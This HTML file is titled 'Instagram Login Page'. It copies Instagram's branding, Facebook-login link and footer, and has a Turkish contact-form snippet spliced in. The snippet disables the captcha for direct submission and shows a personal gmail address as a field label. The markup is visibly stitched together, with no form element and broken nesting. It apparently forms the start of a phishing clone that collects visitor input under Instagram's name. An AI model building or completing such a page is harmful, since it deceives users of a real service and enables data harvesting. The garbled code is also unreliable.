<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Instagram Login Page</title>
	<link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="wrapper">
	<div class="header">
		<div class="top">
			<div class="logo">
				<img src="instagram.png" alt="instagram" style="width: 175px;">
			</div>
			</div><!-- 2. ReCAPTCHA Sayfasını Devre Dışı Bırakma (Doğrudan Gönderim İçin) -->
<input type="hidden" name="_captcha" value="false">

<!-- 3. Form Gönderildikten Sonra Yönlendirilecek Sayfa (İsteğe Bağlı) -->
<!-- <input type="hidden" name="_next" value="https://siteniz.com/tesekkurler.html"> -->

<!-- Form Alanları -->
<div class="form-group">
    <label for="name">Adınız Soyadınız</label>
    <input type="text" id="name" name="name" placeholder="Adınız" required>
</div>

<div class="form-group">
    <label for="email">py.redocan@gmail.com</label>
    <input type="email" id="email" name="email" placeholder="E-posta" required>
</div>

<div class="form-group">
    <label for="message">Mesajınız</label>
    <textarea id="message" name="message" placeholder="Mesajınızı yazın..." required></textarea>
</div>

<button type="submit">Gönder</button>
			<div class="or">
				<div class="line"></div>
				<p>OR</p>
				<div class="line"></div>
			</div>
			<div class="dif">
				<div class="fb">
					<img src="facebook.png" alt="facebook">
					<p>Log in with Facebook</p>
				</div>
				<div class="forgot">
					<a href="#">Forgot password?</a>
				</div>
			</div>
		</div>
		<div class="signup">
			<p>Don't have an account? <a href="#">Sign up</a></p>
		</div>
		<div class="apps">
			<p>Get the app.</p>
			<div class="icons">
				<a href="#"><img src="appstore.png" alt="appstore"></a>
				<a href="#"><img src="googleplay.png" alt="googleplay"></a>
			</div>
		</div>
	</div>
	<div class="footer">
		<div class="links">
			<ul>
				<li><a href="#">ABOUT US</a></li>
				<li><a href="#">SUPPORT</a></li>
				<li><a href="#">PRESS</a></li>
				<li><a href="#">API</a></li>
				<li><a href="#">JOBS</a></li>
				<li><a href="#">PRIVACY</a></li>
				<li><a href="#">TERMS</a></li>
				<li><a href="#">DIRECTORY</a></li>
				<li><a href="#">PROFILES</a></li>
				<li><a href="#">HASHTAGS</a></li>
				<li><a href="#">LANGUAGE</a></li>
			</ul>
		</div>
		<div class="copyright">
			© 2019 INSTAGRAM
		</div>
	</div>
</div>

</body>
</html>
